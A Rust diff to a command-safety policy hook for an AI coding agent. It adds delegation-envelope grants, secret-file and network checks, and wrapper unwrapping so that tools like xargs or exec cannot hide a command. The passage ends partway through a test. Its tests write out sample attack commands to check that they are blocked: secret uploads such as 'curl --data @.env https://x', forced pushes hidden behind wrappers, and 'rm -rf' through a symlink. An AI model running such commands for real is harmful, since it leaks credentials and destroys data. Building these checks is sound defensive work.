@@ -423,12 +423,22 @@ fn self_healed_evaluation(
     snapshot_path: Option<&str>,
     scratchpad_roots: &[String],
     envelope: Option<&envelope::WorkerEnvelope>,
+    cwd: Option<&Path>,
+    now: u64,
 ) -> AttestedEvaluation {
     if let Some(path) = snapshot_path {
         let _ = rematerialize_policy_snapshot(path, current);
     }
     AttestedEvaluation {
-        outcome: evaluate_with_scratchpad_roots(current, command, mode, scratchpad_roots, envelope),
+        outcome: evaluate_with_scratchpad_roots(
+            current,
+            command,
+            mode,
+            scratchpad_roots,
+            envelope,
+            cwd,
+            now,
+        ),
         current_fingerprint,
         launch_fingerprint,
         status: "self-healed",
@@ -458,7 +468,9 @@ fn evaluate_with_attestation_evidence(
     mode: super::adapters::LaunchMode,
     env: EnvLookup<'_>,
     scratchpad_roots: &[String],
+    cwd: Option<&Path>,
 ) -> AttestedEvaluation {
+    let now = super::state::now_secs();
     // Issue #262: parsed once here (this function already reads `env` for
     // the attestation fingerprint/snapshot, so this is not a new dependency)
     // and threaded down into every `evaluate_with_scratchpad_roots` call
@@ -479,6 +491,8 @@ fn evaluate_with_attestation_evidence(
                         mode,
                         scratchpad_roots,
                         envelope,
+                        cwd,
+                        now,
                     ),
                     current_fingerprint,
                     launch_fingerprint: None,
@@ -497,6 +511,8 @@ fn evaluate_with_attestation_evidence(
                     None,
                     scratchpad_roots,
                     envelope,
+                    cwd,
+                    now,
                 );
             }
         };
@@ -514,6 +530,8 @@ fn evaluate_with_attestation_evidence(
             Some(snapshot_path.as_str()),
             scratchpad_roots,
             envelope,
+            cwd,
+            now,
         );
     };
     if policy_fingerprint(&launch).ok().as_deref() != Some(expected_fingerprint.as_str()) {
@@ -526,13 +544,29 @@ fn evaluate_with_attestation_evidence(
             Some(snapshot_path.as_str()),
             scratchpad_roots,
             envelope,
+            cwd,
+            now,
         );
     }
 
-    let current_outcome =
-        evaluate_with_scratchpad_roots(current, command, mode, scratchpad_roots, envelope);
-    let launch_outcome =
-        evaluate_with_scratchpad_roots(&launch, command, mode, scratchpad_roots, envelope);
+    let current_outcome = evaluate_with_scratchpad_roots(
+        current,
+        command,
+        mode,
+        scratchpad_roots,
+        envelope,
+        cwd,
+        now,
+    );
+    let launch_outcome = evaluate_with_scratchpad_roots(
+        &launch,
+        command,
+        mode,
+        scratchpad_roots,
+        envelope,
+        cwd,
+        now,
+    );
     let divergence = if verdict_rank(launch_outcome.verdict) > verdict_rank(current_outcome.verdict)
     {
         SnapshotDivergence::SnapshotStricter {
@@ -1277,13 +1311,20 @@ fn apply_sql_outcome(policy: &SafetyPolicy, command: &str, base: Outcome) -> Out
 }
 
 fn apply_credential_outcome(command: &str, base: Outcome) -> Outcome {
-    if !is_sensitive_credential_access(command) || base.verdict == Verdict::Deny {
+    if base.verdict == Verdict::Deny {
         return base;
     }
+    let (verdict, pattern) = if is_sensitive_credential_access(command) {
+        (Verdict::Deny, "<credential: sensitive-file access>")
+    } else if is_sensitive_file_access(command, |path| project_secret_path(path, false)) {
+        (Verdict::Ask, "<project secret file read>")
+    } else {
+        return base;
+    };
     Outcome {
-        verdict: Verdict::Deny,
+        verdict,
         matched: Some(Rule {
-            pattern: "<credential: sensitive-file access>".to_string(),
+            pattern: pattern.to_string(),
             origin: Origin::BuiltIn,
         }),
     }
@@ -1741,7 +1782,7 @@ pub fn evaluate(
     command: &str,
     mode: super::adapters::LaunchMode,
 ) -> Outcome {
-    evaluate_with_scratchpad_roots(policy, command, mode, &[], None)
+    evaluate_with_scratchpad_roots(policy, command, mode, &[], None, None, 0)
 }
 
 /// Same as [`evaluate`], but also threads `scratchpad_roots` down into the
@@ -1763,6 +1804,8 @@ pub(crate) fn evaluate_with_scratchpad_roots(
     mode: super::adapters::LaunchMode,
     scratchpad_roots: &[String],
     envelope: Option<&envelope::WorkerEnvelope>,
+    cwd: Option<&Path>,
+    now: u64,
 ) -> Outcome {
     let base = evaluate_candidates(
         policy,
@@ -1771,7 +1814,7 @@ pub(crate) fn evaluate_with_scratchpad_roots(
         mode,
         scratchpad_roots,
     );
-    apply_envelope_outcome(envelope, command, scratchpad_roots, base)
+    apply_envelope_outcome(envelope, command, scratchpad_roots, cwd, now, base)
 }
 
 /// Issue #262: a command a delegation envelope forbids is `Deny` --
@@ -1785,6 +1828,8 @@ fn apply_envelope_outcome(
     envelope: Option<&envelope::WorkerEnvelope>,
     command: &str,
     scratchpad_roots: &[String],
+    cwd: Option<&Path>,
+    now: u64,
     base: Outcome,
 ) -> Outcome {
     let Some(envelope) = envelope else {
@@ -1797,10 +1842,34 @@ fn apply_envelope_outcome(
             origin: Origin::BuiltIn,
         }),
     };
-    if !envelope.destructive && command_is_destructive(command, scratchpad_roots) {
+    if !envelope.tools.shell {
+        return deny("shell tool not granted");
+    }
+    if envelope.expires_at < now {
+        return deny("expired");
+    }
+    let candidates = normalize_segments(command);
+    if (!envelope.network || !envelope.tools.network)
+        && candidates.iter().any(|candidate| {
+            sql_tokens(candidate)
+                .and_then(|tokens| {
+                    tokens
+                        .first()
+                        .map(|first| is_network_program(&sql_program_name(first)))
+                })
+                .unwrap_or(false)
+        })
+    {
+        return deny("network not granted");
+    }
+    if !envelope.destructive
+        && candidates
+            .iter()
+            .any(|candidate| command_is_destructive(candidate, scratchpad_roots))
+    {
         return deny("destructive command outside the delegation envelope");
     }
-    if envelope_write_targets_confined(command, envelope) == Some(false) {
+    if envelope_write_targets_confined(command, envelope, cwd) == Some(false) {
         return deny("write target outside the delegation envelope's paths");
     }
     base
@@ -1829,11 +1898,24 @@ fn command_is_destructive(command: &str, scratchpad_roots: &[String]) -> bool {
 fn envelope_write_targets_confined(
     command: &str,
     envelope: &envelope::WorkerEnvelope,
+    cwd: Option<&Path>,
 ) -> Option<bool> {
     let sanitized = redact_single_quoted_heredocs(command);
+    let resolve = |path: &str| {
+        let path = match cwd {
+            Some(cwd) => resolve_repo_write_target(path, &cwd.to_string_lossy())?,
+            None => path.to_string(),
+        };
+        Some(envelope::PathScope::new(path))
+    };
+    let roots = envelope
+        .paths
+        .iter()
+        .filter_map(|root| resolve(&root.0))
+        .collect::<Vec<_>>();
     let mut confined = true;
     let mut saw_any_target = false;
-    for segment in split_segments(&sanitized) {
+    for segment in normalize_segments(&sanitized) {
         let targets = segment_write_targets(&segment)?;
         for target in &targets {
             saw_any_target = true;
@@ -1843,8 +1925,8 @@ fn envelope_write_targets_confined(
             if target.contains(['$', '`', '~', '*', '?']) {
                 return None;
             }
-            let scope = envelope::PathScope::new(target.clone());
-            if !envelope.paths.iter().any(|root| scope.is_subset_of(root)) {
+            let scope = resolve(target)?;
+            if !roots.iter().any(|root| scope.is_subset_of(root)) {
                 confined = false;
             }
         }
@@ -2960,6 +3042,44 @@ struct LauncherPrefix {
 
 const LAUNCHER_PREFIXES: &[LauncherPrefix] = &[
     LauncherPrefix {
+        program: "xargs",
+        value_flags: &[
+            "-I",
+            "-n",
+            "-P",
+            "-L",
+            "-d",
+            "-s",
+            "-a",
+            "-E",
+            "--max-args",
+            "--max-procs",
+            "--replace",
+            "--delimiter",
+            "--arg-file",
+        ],
+        no_command_flags: &[],
+        operands: 0,
+    },
+    LauncherPrefix {
+        program: "command",
+        value_flags: &[],
+        no_command_flags: &[],
+        operands: 0,
+    },
+    LauncherPrefix {
+        program: "builtin",
+        value_flags: &[],
+        no_command_flags: &[],
+        operands: 0,
+    },
+    LauncherPrefix {
+        program: "exec",
+        value_flags: &["-a"],
+        no_command_flags: &[],
+        operands: 0,
+    },
+    LauncherPrefix {
         program: "nohup",
         value_flags: &[],
         no_command_flags: &[],
@@ -3046,19 +3166,18 @@ pub(crate) fn unwrap_launcher_prefix(segment: &str) -> Option<String> {
         if launcher
             .no_command_flags
             .iter()
-            .any(|flag| token.eq_ignore_ascii_case(flag))
+            .any(|flag| token == flag || (program != "xargs" && token.eq_ignore_ascii_case(flag)))
         {
             return None;
         }
-        i += if launcher
-            .value_flags
-            .iter()
-            .any(|flag| token.eq_ignore_ascii_case(flag))
-        {
-            2
-        } else {
-            1
-        };
+        i +=
+            if launcher.value_flags.iter().any(|flag| {
+                token == flag || (program != "xargs" && token.eq_ignore_ascii_case(flag))
+            }) {
+                2
+            } else {
+                1
+            };
     }
     i = i.saturating_add(launcher.operands);
     (i < tokens.len()).then(|| tokens[i..].join(" "))
@@ -3301,17 +3420,9 @@ pub(crate) fn normalize_segments(command: &str) -> Vec<String> {
 // guessed at): this classifier and `provably_generated_cleanup` below
 // reason about `path` as TEXT only -- a string starting with `node_modules`/
 // `target`/... -- never about what that path actually resolves to on disk.
-// A symlink or junction planted at a generated-directory root (e.g.
-// `node_modules` symlinked to a sensitive directory) is auto-`Allow`ed by
-// the interactive fast path exactly like a real generated directory would
-// be. Closing this needs an `fs::symlink_metadata` check, which this module
-// deliberately does not do: `evaluate`/`evaluate_candidates` and everything
-// they call are pure (no clock, filesystem or environment access, see this
-// module's other classifiers' own doc comments) so a policy decision is
-// reproducible and testable without touching disk. Resolving symlinks
-// belongs one layer up, in whichever caller already does I/O -- it is not
-// bounded within this pure pipeline without that larger seam, so it is
-// commented here rather than half-fixed.
+// The hook caller checks literal targets and their ancestors for symlinks
+// before returning this fast path's Allow. This pure pipeline itself has
+// no filesystem access; argv-only evaluation still reasons about text.
 fn generated_path(path: &str) -> bool {
     let normalized = path
         .trim_matches(['\'', '"'])
@@ -4054,17 +4165,25 @@ fn sensitive_credential_path(raw: &str) -> bool {
         )
 }
 
-fn sensitive_upload_path(raw: &str) -> bool {
-    if sensitive_credential_path(raw) {
-        return true;
-    }
+fn project_secret_path(raw: &str, include_templates: bool) -> bool {
     let path = raw
         .trim_start_matches('@')
         .trim_matches(['\'', '"'])
         .replace('\\', "/")
         .to_ascii_lowercase();
     let basename = path.rsplit('/').next().unwrap_or(&path);
-    basename == ".env" || basename.starts_with(".env.")
+    (basename == ".env" || basename.starts_with(".env."))
+        && (include_templates
+            || !matches!(
+                basename,
+                ".env.example" | ".env.sample" | ".env.template" | ".env.dist" | ".env.test"
+            ))
+        || basename.ends_with(".pem")
+        || basename.ends_with(".key")
+}
+
+fn sensitive_upload_path(raw: &str) -> bool {
+    sensitive_credential_path(raw) || project_secret_path(raw, true)
 }
 
 /// A small cross-shell tripwire for direct access to files whose contents or
@@ -4075,15 +4194,12 @@ fn sensitive_upload_path(raw: &str) -> bool {
 /// the containment layer's responsibility; this deliberately does not claim
 /// to be a general shell parser.
 fn is_sensitive_credential_access(command: &str) -> bool {
-    let Some(tokens) = sql_tokens(&collapse_whitespace(command)) else {
-        return false;
-    };
-    let Some(first) = tokens.first() else {
-        return false;
-    };
-    let program = sql_program_name(first);
-    let file_access_program = matches!(
-        program.as_str(),
+    is_sensitive_file_access(command, sensitive_credential_path)
+}
+
+fn is_file_access_program(program: &str) -> bool {
+    matches!(
+        program,
         "cat"
             | "head"
             | "tail"
@@ -4113,12 +4229,26 @@ fn is_sensitive_credential_access(command: &str) -> bool {
             | "7z"
             | "scp"
             | "rsync"
-    ) || (program == "echo" && command.contains('>'));
-    file_access_program
-        && tokens
-            .iter()
-            .skip(1)
-            .any(|token| sensitive_credential_path(token))
+            | "touch"
+            | "mkdir"
+            | "truncate"
+            | "install"
+            | "dd"
+            | "ln"
+    )
+}
+
+fn is_sensitive_file_access(command: &str, sensitive_path: fn(&str) -> bool) -> bool {
+    let Some(tokens) = sql_tokens(&collapse_whitespace(command)) else {
+        return false;
+    };
+    let Some(first) = tokens.first() else {
+        return false;
+    };
+    let program = sql_program_name(first);
+    let file_access_program =
+        is_file_access_program(&program) || (program == "echo" && command.contains('>'));
+    file_access_program && tokens.iter().skip(1).any(|token| sensitive_path(token))
 }
 
 /// Path prefixes that name the operator's own home directory in the shells
@@ -4299,14 +4429,17 @@ fn network_rule(verdict: Verdict, pattern: &str) -> Outcome {
 /// use most often. Reads/downloads and loopback development traffic remain
 /// silent. Dynamic or absent destinations on a mutating invocation are
 /// treated as remote because the hook cannot prove otherwise.
+fn is_network_program(program: &str) -> bool {
+    matches!(
+        program,
+        "curl" | "wget" | "invoke-restmethod" | "invoke-webrequest" | "irm" | "iwr"
+    )
+}
+
 fn network_outcome(command: &str) -> Option<Outcome> {
     let tokens = sql_tokens(&collapse_whitespace(command))?;
     let program = sql_program_name(tokens.first()?);
-    let supported = matches!(
-        program.as_str(),
-        "curl" | "wget" | "invoke-restmethod" | "invoke-webrequest" | "irm" | "iwr"
-    );
-    if !supported {
+    if !is_network_program(&program) {
         return None;
     }
 
@@ -5793,7 +5926,7 @@ fn scan_redirection_targets_at_depth(segment: &str, depth: usize) -> Option<Vec<
 /// if this cannot be confidently resolved -- either a dangling redirection
 /// operator ([`scan_redirection_targets`] itself), or a `tee` argument
 /// containing `$`/backtick so it cannot be proven a literal path.
-fn segment_write_targets(segment: &str) -> Option<Vec<String>> {
+fn segment_redirect_targets(segment: &str) -> Option<Vec<String>> {
     let mut targets = scan_redirection_targets(segment)?;
     if let Some(tokens) = sql_tokens(&collapse_whitespace(segment))
         && let Some(first) = tokens.first()
@@ -5812,11 +5945,75 @@ fn segment_write_targets(segment: &str) -> Option<Vec<String>> {
     Some(targets)
 }
 
+fn segment_write_targets(segment: &str) -> Option<Vec<String>> {
+    let mut targets = segment_redirect_targets(segment)?;
+    let Some(tokens) = sql_tokens(&collapse_whitespace(segment)) else {
+        return Some(targets);
+    };
+    let Some(first) = tokens.first() else {
+        return Some(targets);
+    };
+    let program = sql_program_name(first);
+    if !is_file_access_program(&program) {
+        return Some(targets);
+    }
+    match program.as_str() {
+        "cp" | "mv" | "ln" | "install" | "rsync" => {
+            if let Some(target) = tokens
+                .iter()
+                .enumerate()
+                .skip(1)
+                .find_map(|(i, _)| {
+                    option_value(&tokens, i, &["-t", "--target-directory"])
+                        .filter(|_| program != "rsync")
+                })
+                .or_else(|| last_non_flag_argument(&tokens))
+            {
+                targets.push(target.to_string());
+            }
+        }
+        "touch" | "mkdir" | "truncate" | "rm" => {
+            let value_flags: &[&str] = match program.as_str() {
+                "touch" => &["-t", "-d", "-r", "--date", "--reference"],
+                "mkdir" => &["-m", "--mode"],
+                "truncate" => &["-s", "-r", "--size", "--reference"],
+                _ => &[],
+            };
+            let mut i = 1;
+            let mut options = true;
+            while i < tokens.len() {
+                let token = &tokens[i];
+                if options && token == "--" {
+                    options = false;
+                } else if options && value_flags.contains(&token.as_str()) {
+                    i += 1;
+                } else if !options || !token.starts_with('-') {
+                    targets.push(token.clone());
+                }
+                i += 1;
+            }
+        }
+        "sed" if tokens[1..].iter().any(|t| is_sed_perl_inplace_flag(t)) => {
+            targets.extend(sed_perl_inplace_targets(&program, &tokens));
+        }
+        "dd" => targets.extend(
+            tokens[1..]
+                .iter()
+                .filter_map(|t| t.strip_prefix("of=").map(str::to_string)),
+        ),
+        _ => {}
+    }
+    if targets.iter().any(|target| target.contains(['$', '`'])) {
+        return None;
+    }
+    Some(targets)
+}
+
 /// Issue #168, design decision (d): whether every write target across every
 /// segment of `command` is `/dev/null` or beneath one of `scratchpad_roots`.
 /// `None` -- no opinion, exactly today's un-analyzed behavior -- whenever
 /// `scratchpad_roots` is empty, any segment's own targets cannot be
-/// confidently resolved (see [`segment_write_targets`]), a target contains
+/// confidently resolved (see [`segment_redirect_targets`]), a target contains
 /// `$`/backtick (built through substitution/expansion this text-only module
 /// cannot resolve -- distinct from a target merely containing `~`/a glob
 /// character, which [`target_is_confined`] can confidently call "not
@@ -5839,7 +6036,8 @@ pub(crate) fn write_targets_confined(command: &str, scratchpad_roots: &[String])
     let mut confined = true;
     let mut saw_any_target = false;
     for segment in split_segments(&sanitized) {
-        let targets = segment_write_targets(&segment)?;
+        // Keep auto-allow limited to the original redirection/tee write shapes.
+        let targets = segment_redirect_targets(&segment)?;
         for target in &targets {
             saw_any_target = true;
             if target.contains(['$', '`']) {
@@ -7803,7 +8001,20 @@ pub fn run_check<W: Write>(args: &CheckArgs, w: &mut W, env: EnvLookup<'_>) -> C
 
     if !args.command.is_empty() {
         let command = args.command.join(" ");
-        let outcome = evaluate(&cfg.safety, &command, args.mode);
+        let scratchpad_roots = scratchpad_write_roots(&std::env::temp_dir());
+        let cwd = std::env::current_dir().ok();
+        let cwd = cwd.as_deref();
+        let now = super::state::now_secs();
+        let envelope = parse_envelope_env(env);
+        let outcome = evaluate_with_scratchpad_roots(
+            &cfg.safety,
+            &command,
+            args.mode,
+            &scratchpad_roots,
+            envelope.as_ref(),
+            cwd,
+            now,
+        );
         writeln!(w, "{}", render_outcome(&command, &outcome))?;
         return Ok(outcome.verdict.exit_code());
     }
@@ -8138,12 +8349,14 @@ fn run_check_hook_mode_with_env<W: Write>(
     });
     let orchestrator_posture = super::hook::orchestrator_write_posture(cfg);
 
+    let cwd = (!payload.cwd.is_empty()).then(|| Path::new(&payload.cwd));
     let evidence = evaluate_with_attestation_evidence(
         &cfg.safety,
         &effective_command,
         mode,
         env,
         &scratchpad_roots,
+        cwd,
     );
     let mut outcome = evidence.outcome.clone();
     let mut orchestrator_advisory: Option<String> = None;
@@ -8407,6 +8620,37 @@ fn run_check_hook_mode_with_env<W: Write>(
         }
     }
 
+    if outcome.verdict == Verdict::Allow
+        && evidence
+            .outcome
+            .matched
+            .as_ref()
+            .is_some_and(|rule| rule.pattern == "<filesystem: generated-directory cleanup>")
+        && let Some(cwd) = cwd
+        && let Some(tokens) = sql_tokens(&effective_command)
+        && tokens
+            .iter()
+            .skip(1)
+            .filter(|target| generated_path(target))
+            .any(|target| {
+                Path::new(target)
+                    .ancestors()
+                    .filter(|path| !path.as_os_str().is_empty())
+                    .any(|path| {
+                        std::fs::symlink_metadata(cwd.join(path))
+                            .is_ok_and(|meta| meta.file_type().is_symlink())
+                    })
+            })
+    {
+        outcome = Outcome {
+            verdict: Verdict::Ask,
+            matched: Some(Rule {
+                pattern: "<filesystem: generated-directory symlink>".into(),
+                origin: Origin::BuiltIn,
+            }),
+        };
+    }
+
     // Neither this guard's own warn note nor the orchestrator-write advisory
     // seeded above is ever meant to survive onto a `Deny` -- the identical-
     // command guard's own `refuses` branch (just above) can turn a prior
@@ -8555,12 +8799,15 @@ pub fn run_explain<W: Write>(args: &ExplainArgs, w: &mut W, env: EnvLookup<'_>) 
     // env`), so this command's VCS narrowing (issue #306) agrees with what
     // the hook actually decided for the identical command.
     let scratchpad_roots = scratchpad_write_roots(&std::env::temp_dir());
+    let cwd = std::env::current_dir().ok();
+    let cwd = cwd.as_deref();
     let evidence = evaluate_with_attestation_evidence(
         &cfg.safety,
         &command,
         args.mode,
         env,
         &scratchpad_roots,
+        cwd,
     );
     // Issue #262: re-parsed here (rather than threaded out of `evidence`)
     // purely to print its own contribution -- `evaluate_with_attestation_
@@ -10838,6 +11085,7 @@ mod tests {
                 mode,
                 &|k| env.get(k).cloned(),
                 &[],
+                None,
             );
             assert_eq!(
                 evidence.outcome.verdict, expected,
@@ -10874,6 +11122,7 @@ mod tests {
             LaunchMode::Interactive,
             &|k| env.get(k).cloned(),
             &[],
+            None,
         );
         assert_eq!(evidence.outcome.verdict, Verdict::Deny);
         assert_eq!(evidence.status, "self-healed");
@@ -10897,6 +11146,7 @@ mod tests {
             LaunchMode::Headless,
             &|k| env.get(k).cloned(),
             &[],
+            None,
         );
         assert_eq!(first.status, "self-healed");
         assert!(snapshot.exists(), "the snapshot file must be rewritten");
@@ -10920,6 +11170,7 @@ mod tests {
             LaunchMode::Interactive,
             &|k| env.get(k).cloned(),
             &[],
+            None,
         );
         assert_eq!(evidence.status, "self-healed");
         assert_eq!(evidence.outcome.verdict, Verdict::Allow);
@@ -11039,6 +11290,7 @@ mod tests {
             LaunchMode::Interactive,
             &|key| env.get(key).cloned(),
             &[],
+            None,
         );
         assert_eq!(evidence.outcome.verdict, Verdict::Ask, "{evidence:?}");
         assert_eq!(
@@ -11075,6 +11327,7 @@ mod tests {
             LaunchMode::Interactive,
             &|key| env.get(key).cloned(),
             &[],
+            None,
         );
         assert_eq!(evidence.divergence, SnapshotDivergence::Unchanged);
     }
@@ -11957,9 +12210,54 @@ mod tests {
     /// `timeout`, `nohup`, `setsid`, `nice`, `stdbuf`, `flock`, ... -- hid
     /// the program it launched from every classifier in this module.
     #[test]
+    fn force_push_asks_in_every_reviewed_interactive_wrapper() {
+        let policy = SafetyPolicy::default();
+        for command in [
+            r#"git push --force"#,
+            r#"env FOO=bar git push --force"#,
+            r#"timeout 5 git push --force"#,
+            r#"nice git push --force"#,
+            r#"nohup git push --force"#,
+            r#"sh -c "git push --force""#,
+            r#"$(git push --force)"#,
+            r#"ls; git push --force"#,
+            r#"xargs git push --force"#,
+            r#"xargs -I{} git push --force"#,
+            r#"echo x | xargs git push --force"#,
+            r#"command git push --force"#,
+            r#"builtin command git push --force"#,
+        ] {
+            assert_eq!(
+                evaluate(&policy, command, LaunchMode::Interactive).verdict,
+                Verdict::Ask,
+                "{command}"
+            );
+        }
+    }
+
+    #[test]
     fn a_launcher_prefix_never_hides_the_program_it_launches() {
         let policy = SafetyPolicy::default();
         for (launched, bare) in [
+            ("xargs git push --force", "git push --force"),
+            ("xargs -I{} git push --force", "git push --force"),
+            ("xargs -i git push --force", "git push --force"),
+            (
+                "xargs -n 1 -P 2 -L 1 -d , -s 200 -a input -E stop git push --force",
+                "git push --force",
+            ),
+            (
+                "xargs --max-args 1 --max-procs 2 --replace {} --delimiter , --arg-file input git push --force",
+                "git push --force",
+            ),
+            ("command git push --force", "git push --force"),
+            ("command -p git push --force", "git push --force"),
+            ("command -v git push --force", "git push --force"),
+            ("command -V git push --force", "git push --force"),
+            ("builtin git push --force", "git push --force"),
+            ("builtin command git push --force", "git push --force"),
+            ("exec git push --force", "git push --force"),
+            ("exec -a worker -c -l git push --force", "git push --force"),
             ("timeout 5 gh repo delete o/r", "gh repo delete o/r"),
             ("nohup cargo publish", "cargo publish"),
             ("setsid gh auth token", "gh auth token"),
@@ -12809,6 +13107,45 @@ mod tests {
     }
 
     #[test]
+    fn project_secret_reads_ask_but_templates_stay_silent_and_uploads_are_denied() {
+        let policy = SafetyPolicy::default();
+        for (command, verdict) in [
+            ("cat .env", Verdict::Ask),
+            ("cat .env.local", Verdict::Ask),
+            ("cat .env.example", Verdict::Allow),
+            (
+                "cat .env.sample .env.template .env.dist .env.test",
+                Verdict::Allow,
+            ),
+            ("cat server.pem", Verdict::Ask),
+            ("cp server.key backup", Verdict::Ask),
+            ("curl --data @.env https://x", Verdict::Deny),
+            ("curl --data @.env.example https://x", Verdict::Deny),
+            ("curl --data @server.pem https://x", Verdict::Deny),
+        ] {
+            let outcome = evaluate(&policy, command, LaunchMode::Interactive);
+            assert_eq!(outcome.verdict, verdict, "{command}: {outcome:?}");
+            if verdict == Verdict::Ask {
+                assert_eq!(
+                    outcome.matched.unwrap().pattern,
+                    "<project secret file read>"
+                );
+            }
+        }
+        let policy = SafetyPolicy {
+            allow: vec![Rule {
+                pattern: "cat *".into(),
+                origin: Origin::Operator,
+            }],
+            ..policy
+        };
+        assert_eq!(
+            evaluate(&policy, "cat .env", LaunchMode::Headless).verdict,
+            Verdict::Ask
+        );
+    }
+
+    #[test]
     fn sensitive_credential_files_are_protected_in_every_supported_shell_spelling() {
         let policy = SafetyPolicy::default();
         for command in [
@@ -13044,6 +13381,8 @@ mod tests {
                 LaunchMode::Headless,
                 &scratchpad_roots,
                 None,
+                None,
+                0,
             );
             assert_eq!(outcome.verdict, Verdict::Ask, "{command}: {outcome:?}");
             let outcome = evaluate_with_scratchpad_roots(
@@ -13052,6 +13391,8 @@ mod tests {
                 LaunchMode::Interactive,
                 &scratchpad_roots,
                 None,
+                None,
+                0,
             );
             assert_eq!(
                 outcome.verdict,
@@ -13076,6 +13417,8 @@ mod tests {
                 LaunchMode::Headless,
                 &scratchpad_roots,
                 None,
+                None,
+                0,
             );
             assert_eq!(outcome.verdict, Verdict::Allow, "{command}: {outcome:?}");
             let outcome = evaluate_with_scratchpad_roots(
@@ -13084,6 +13427,8 @@ mod tests {
                 LaunchMode::Interactive,
                 &scratchpad_roots,
                 None,
+                None,
+                0,
             );
             assert_eq!(
                 outcome.verdict,
@@ -13293,8 +13638,16 @@ mod tests {
         for mode in [LaunchMode::Interactive, LaunchMode::Headless] {
             for command in &commands {
                 assert_eq!(
-                    evaluate_with_scratchpad_roots(&policy, command, mode, &scratchpad_roots, None)
-                        .verdict,
+                    evaluate_with_scratchpad_roots(
+                        &policy,
+                        command,
+                        mode,
+                        &scratchpad_roots,
+                        None,
+                        None,
+                        0
+                    )
+                    .verdict,
                     Verdict::Allow,
                     "{mode:?}: {command}"
                 );
@@ -14778,6 +15131,273 @@ mod tests {
         assert_eq!(code, Verdict::Ask.exit_code());
         let text = String::from_utf8(out).unwrap();
         assert!(text.contains("ask"), "got {text}");
+    }
+
+    #[cfg(unix)]
+    #[test]
+    fn generated_directory_cleanup_asks_when_a_literal_target_or_ancestor_is_a_symlink() {
+        let repo = tempfile::tempdir().unwrap();
+        let home = tempfile::tempdir().unwrap();
+        let _home = super::super::testenv::HomeGuard::set(home.path());
+        let cfg = CtxConfig::load(repo.path(), &|_| None).unwrap();
+        std::fs::create_dir(repo.path().join("real")).unwrap();
+        std::fs::create_dir(repo.path().join("target")).unwrap();
+        std::os::unix::fs::symlink(repo.path().join("real"), repo.path().join("node_modules"))
+            .unwrap();
+        for (command, decision) in [
+            ("rm -rf node_modules", "ask"),
+            ("rm -rf node_modules/subdir", "ask"),
+            ("rm -rf target", "allow"),
+        ] {
+            let stdin = serde_json::json!({"tool_name":"Bash", "tool_input":{"command":command},
+                "cwd":repo.path(), "permission_mode":"default"})
+            .to_string();
+            let mut out = Vec::new();
+            run_check_hook_mode_with_env(&cfg, &mut out, &stdin, &|_| None).unwrap();
+            let value: serde_json::Value = serde_json::from_slice(&out).unwrap();
+            assert_eq!(
+                value["hookSpecificOutput"]["permissionDecision"], decision,
+                "{command}"
+            );
+            if decision == "ask" {
+                assert!(
+                    value["hookSpecificOutput"]["permissionDecisionReason"]
+                        .as_str()
+                        .unwrap()
+                        .contains("generated-directory symlink")
+                );
+            }
+        }
+    }
+
+    fn safety_test_envelope() -> envelope::WorkerEnvelope {
+        envelope::WorkerEnvelope {
+            principal: "audit/worker".into(),
+            paths: vec![envelope::PathScope::new("allowed")],
+            tools: envelope::ToolSet::all(),
+            network: true,
+            destructive: false,
+            delegation_depth: 0,
+            expires_at: u64::MAX,
+            token_budget: Some(100),
+        }
+    }
+
+    #[test]
+    fn envelope_write_scopes_resolve_relative_and_absolute_targets_against_the_hook_cwd() {
+        let mut envelope = safety_test_envelope();
+        for (scope, target, confined) in [
+            ("allowed", "allowed/out.txt", true),
+            ("allowed", "/w/allowed/out.txt", true),
+            ("allowed", "/allowed/out.txt", false),
+            ("allowed", "../out.txt", false),
+            ("allowed", "allowed/../allowed/out.txt", true),
+            (".", "/w/anything", true),
+            (".", "sub/file", true),
+            (".", "/etc/passwd", false),
+        ] {
+            envelope.paths = vec![envelope::PathScope::new(scope)];
+            assert_eq!(
+                envelope_write_targets_confined(
+                    &format!("echo x > {target}"),
+                    &envelope,
+                    Some(Path::new("/w"))
+                ),
+                Some(confined),
+                "{scope}: {target}"
+            );
+        }
+        envelope.paths = vec![envelope::PathScope::new("allowed")];
+        assert_eq!(
+            envelope_write_targets_confined("echo x > allowed/out", &envelope, None),
+            Some(true)
+        );
+    }
+
+    #[test]
+    fn file_mutation_destinations_cannot_escape_the_envelopes_paths() {
+        let envelope = safety_test_envelope();
+        for command in [
+            "cp input.txt outside.txt",
+            "mv input.txt outside.txt",
+            "ln input.txt outside.txt",
+            "install -m 600 input.txt outside.txt",
+            "rsync -a input.txt outside.txt",
+            "touch outside.txt allowed/file",
+            "mkdir -p outside allowed/dir",
+            "truncate -s 0 outside.txt allowed/file",
+            "rm outside.txt allowed/file",
+            "sed -i 's/a/b/' outside.txt",
+            "sed -i -e 's/a/b/' outside.txt allowed/file",
+            "dd if=input.txt of=outside.txt",
+            "command cp input.txt outside.txt",
+            "sh -c 'touch outside.txt'",
+            "cp -t outside input.txt",
+        ] {
+            assert_eq!(
+                envelope_write_targets_confined(command, &envelope, Some(Path::new("/w"))),
+                Some(false),
+                "{command}"
+            );
+        }
+        for command in [
+            "cp a allowed/b",
+            "touch allowed/b",
+            "mkdir -m 700 allowed/dir",
+            "truncate -s 0 allowed/b",
+            "sed -i -e 's/a/b/' allowed/b",
+            "dd of=allowed/b",
+            "cp -t allowed a",
+            "sed 's/a/b/' outside.txt",
+        ] {
+            assert_ne!(
+                envelope_write_targets_confined(command, &envelope, Some(Path::new("/w"))),
+                Some(false),
+                "{command}"
+            );
+        }
+    }
+
+    #[test]
+    fn envelope_shell_network_and_expiry_grants_are_independent_hard_denials() {
+        let policy = SafetyPolicy::default();
+        let check = |envelope: &envelope::WorkerEnvelope, command| {
+            evaluate_with_scratchpad_roots(
+                &policy,
+                command,
+                LaunchMode::Interactive,
+                &[],
+                Some(envelope),
+                Some(Path::new("/w")),
+                2,
+            )
+        };
+        let mut envelope = safety_test_envelope();
+        envelope.tools.shell = false;
+        let outcome = check(&envelope, "echo allowed");
+        assert_eq!(outcome.verdict, Verdict::Deny);
+        assert_eq!(
+            outcome.matched.unwrap().pattern,
+            "<envelope: shell tool not granted>"
+        );
+        envelope.tools.shell = true;
+        assert_eq!(check(&envelope, "echo allowed").verdict, Verdict::Allow);
+        for (network, tool) in [(false, true), (true, false)] {
+            envelope.network = network;
+            envelope.tools.network = tool;
+            for command in [
+                "curl https://example.invalid",
+                "command wget https://example.invalid",
+                "echo x; curl http://localhost",
+                "sh -c 'curl https://example.invalid'",
+            ] {
+                let outcome = check(&envelope, command);
+                assert_eq!(outcome.verdict, Verdict::Deny, "{command}");
+                assert_eq!(
